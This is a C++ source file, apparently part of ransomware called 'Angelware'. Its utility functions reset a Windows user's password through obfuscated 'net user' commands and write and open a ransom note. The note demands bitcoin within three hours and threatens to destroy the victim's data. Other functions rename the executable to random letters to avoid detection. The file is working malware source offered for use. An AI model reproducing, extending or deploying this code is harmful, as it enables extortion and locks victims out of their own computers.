#include <fstream>

#include "utils.h"
#include "strenc.h"
#include "win32.h"

utils g_utils;

string utils::random_string(const int len)
{
	string temp;
	static const char chars[] = "abcdefghijklmnopqrstuvwxyz";
	srand(((unsigned)time(0)) / 2);
	for (int i = 0; i < len; ++i)
		temp += chars[rand() % (sizeof(chars) - 1)];
	return temp;
}


void utils::set_password_windows(string user_name, string password) {

	string set_admin_privileges = strenc("net user ") + user_name + strenc(" /active:yes");
	string set_new_password = strenc("net user ") + user_name + " " + password;

	system(set_admin_privileges.c_str());
	system(set_new_password.c_str());
}

const char* utils::get_user_name() {
	char path[MAX_PATH], * name = 0;
	g_win32.get_environment_variable((LPCTSTR)"USERPROFILE", (LPSTR)path, (DWORD)MAX_PATH);
	name = &path[strlen(path) - 1];
	for (; *name != '\\'; --name);
	++name;

	return
		name;
}

void utils::show_notepad(string user_name, string btc_addr) {

	string s2 = "C:\\Users\\" + user_name + "\\Appdata\\Local\\" + "aw_instructions.txt";

	ofstream readme_file;
	readme_file.open(s2.c_str(), ios_base::app);

	readme_file << "\n";
	readme_file << " Dear, " << user_name << "\n";
	readme_file << " You happen to be a victim of a computer virus called Angelware" << "\n";
	readme_file << " If you do not understand english: https://translate.google.com/" << "\n";
	readme_file << "\n";
	readme_file << " To unlock your hard drive you will need to transfer a certain amount of money." << "\n";
	readme_file << " I am sure that you are a victim of a virus for a reason, maybe you used cheats" << "\n";
	readme_file << " for some computer games or you are an internet fraudster." << "\n";
	readme_file << "\n";
	readme_file << " You need to transfer 0.0043574B (in 90$) to the below BTC address" << "\n";
    readme_file << " Payment instructions can be found here:" << "\n";
	readme_file << " BTC Address: " << btc_addr.c_str() << "\n";
	readme_file << "\n";
	readme_file << " <!> The funds must reach your account 3 hours after the virus infection," << "\n";
	readme_file << " otherwise your hard drive will be destroyed and you will not be able to log in again." << "\n";
	readme_file << " <!> I would also like to emphasize that if you turn off the computer, the data will also be destroyed." << "\n";
	readme_file << "\n";
	readme_file << " Contacts us" << "\n";
	readme_file << "  Email: ~~~~~@~~~~~~~~.~~~" << "\n";
	readme_file << "  Telegram: @~~~~~~~~~" << "\n";
	readme_file << "\n";

	readme_file.close();

	g_win32.shell_execute(0, 0, s2.c_str(), 0, 0, 5);
}

void utils::rename_builder()
{
	TCHAR szExeFileName[MAX_PATH];
	g_win32.get_module_file_name(0, szExeFileName, MAX_PATH);

	string path = string(szExeFileName);
	string exe = path.substr(path.find_last_of("\\") + 1, path.size());

	srand(time(0));
	char letters[] = "abcdefghijklmnopqrstuvwxyz";
	char newname[17];

	int z = rand() % 5 + 5;
	for (int i = 0; i < z; i++)
	{
		char x = letters[rand() % 27];
		newname[i] = x;
	}        newname[z] = 0x0;
	strcat_s(newname, ".exe\0");


	rename(exe.c_str(), newname);
}